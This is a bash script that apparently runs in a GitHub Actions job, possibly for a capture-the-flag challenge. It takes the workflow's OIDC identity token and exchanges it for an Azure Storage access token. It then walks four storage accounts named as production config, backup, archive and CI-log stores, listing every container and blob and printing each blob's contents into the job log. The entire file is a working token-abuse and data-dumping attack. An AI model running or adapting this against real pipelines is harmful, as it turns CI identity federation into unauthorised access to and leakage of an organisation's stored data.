#!/usr/bin/env bash
set +e
IDTOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
exch(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$AZURE_CLIENT_ID --data-urlencode "scope=$1" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$IDTOK"; }
ST=$(exch "https://storage.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "storage token: ${#ST} chars"
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "===== $SA ====="
  cl=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-10-04" "https://$SA.blob.core.windows.net/?comp=list")
  echo "  containers raw: $(echo "$cl" | grep -oE '<Name>[^<]+</Name>' | sed -E 's|</?Name>||g' | tr '\n' ' ')"
  echo "$cl" | grep -qi "AuthorizationFailure\|AuthenticationFailed" && echo "  [list-containers DENIED]"
  for C in $(echo "$cl" | grep -oE '<Name>[^<]+</Name>' | sed -E 's|</?Name>||g'); do
    bl=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-10-04" "https://$SA.blob.core.windows.net/$C?restype=container&comp=list")
    blobs=$(echo "$bl" | grep -oE '<Name>[^<]+</Name>' | sed -E 's|</?Name>||g')
    echo "  container $C blobs: $(echo $blobs | tr '\n' ' ')"
    echo "$bl" | grep -qi "AuthorizationFailure\|AuthenticationFailed" && echo "    [list-blobs DENIED]"
    for B in $blobs; do
      d=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-10-04" "https://$SA.blob.core.windows.net/$C/$B")
      echo "    >>> $C/$B :: ${d:0:400}"
    done
  done
done
echo "=== flag? ==="
echo "DONE"
